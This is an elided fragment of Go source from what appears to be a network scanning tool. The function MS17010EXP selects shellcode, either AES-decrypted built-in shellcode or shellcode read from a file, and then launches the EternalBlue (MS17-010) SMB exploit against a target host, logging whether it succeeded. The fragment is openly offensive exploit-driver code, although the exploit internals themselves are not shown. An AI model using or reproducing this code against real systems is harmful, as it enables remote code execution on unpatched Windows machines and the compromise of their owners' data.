...
func MS17010EXP(info *config.ScannerCfg) {
	...
	case "guest":
		...
		sc = AesDecrypt(sc_enc, key)
	default:
		if strings.Contains(config.SC, "file:") {
			read, err := ioutil.ReadFile(config.SC[5:])
			if err != nil {
				errlog := fmt.Sprintf("[-] ms17010 sc readfile %v error: %v", config.SC, err)
	...
	if err != nil {
		config.LogError("[-] " + info.Host + " MS17-010 shellcode decode error " + err.Error())
		return
	}
	err = eternalBlue(address, 12, 12, sc1)
	if err != nil {
		config.LogError("[-] " + info.Host + " MS17-010 exp failed " + err.Error())
		return
	}
	config.LogSuccess("[*] " + info.Host + "\tMS17-010\texploit end")
}
